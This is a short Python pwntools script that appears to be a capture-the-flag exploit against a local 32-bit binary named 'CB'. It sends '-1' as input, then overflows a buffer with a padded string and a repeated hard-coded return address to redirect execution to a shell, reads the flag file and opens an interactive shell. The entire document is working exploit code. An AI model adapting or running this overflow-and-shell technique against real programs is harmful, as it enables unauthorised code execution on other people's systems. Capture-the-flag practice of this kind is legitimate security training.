from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')
s.recv()
s.sendline('-1')
sh = 0x08048665
s.send('HelloWorld\x00\x00'+p32(sh)*20)

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()